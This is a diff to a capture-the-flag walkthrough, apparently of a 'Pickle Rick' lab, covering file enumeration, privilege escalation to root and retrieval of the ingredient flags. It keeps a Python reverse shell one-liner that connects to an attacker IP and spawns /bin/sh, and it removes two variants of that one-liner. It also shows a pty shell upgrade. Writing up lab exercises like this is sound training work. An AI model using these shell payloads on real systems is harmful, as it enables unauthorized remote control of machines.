@@ -148,21 +148,6 @@ portal.php
 robots.txt
 ~~~
 
-cat
-head
-more
-less
-tail
-nano
-vim
-vi
-grep
-grep -R .
-echo < readme.txt
-while read line; do echo $line; done < clue.txt
-
-
-
 ~~~
 less clue.txt
 Look around the file system for the other ingredient.
@@ -196,13 +181,9 @@ Python 3.5.2
 
 ## Reverse shell
 
+~~~
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.35.106",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
-
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
+~~~
 
 # Solution
  	
@@ -245,7 +226,7 @@ $ cat second\ ingredients
 fleeb juice
 ~~~
 
-
+~~~
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@ip-10-10-207-16:/home/rick$ ls
 ls
@@ -272,3 +253,4 @@ root@ip-10-10-207-16:~# cat 3rd.txt
 cat 3rd.txt
 3rd ingredients: fleeb juice
 root@ip-10-10-207-16:~# 
+~~~
